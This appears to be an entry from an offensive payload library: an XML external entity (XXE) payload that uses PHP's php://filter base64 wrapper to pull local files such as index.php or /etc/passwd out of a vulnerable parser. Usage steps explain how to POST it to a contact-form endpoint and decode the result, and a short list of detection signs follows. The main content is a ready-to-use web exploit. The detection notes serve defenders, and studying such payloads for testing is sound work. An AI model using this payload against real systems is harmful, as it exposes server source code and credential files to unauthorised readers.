---
id: fcd33766-beec-4179-95a6-a989659990af
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.188242+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xxe
  - php-wrapper
  - file-retrieval
  - base64-encode
platforms:
  - Web
  - Linux
validated: true
---

# XXE-PHP-Wrapper-Base64-Encode-Local-File

## Code

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

## Description

This XML payload exploits XXE vulnerabilities by defining an external entity 'xxe' that uses the PHP php://filter wrapper to base64-encode the contents of a local file (index.php in this case). When processed by a vulnerable XML parser in a PHP application, the entity expands in the 'name' field, embedding the encoded file data in the response. This allows retrieval of server-side files without direct access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| resource= | Path to the local file to encode and retrieve | index.php or /etc/passwd |

## Usage

Save as payload.xml and POST to a vulnerable XML-processing endpoint (e.g., contact form). The base64-encoded file will appear in the echoed response field. Decode offline with base64 tools. Used in red team engagements for initial file disclosure in web apps.

## Detection

- WAF rules blocking php:// or base64 patterns in XML inputs.
- XML parser logs showing entity expansion or filter stream access.
- Anomalous long strings in application responses indicating encoded data.
- Network monitoring for XML payloads with DTDs.

## Related

- [[procedures/XXE-File-Retrieval-with-PHP-Wrapper]]
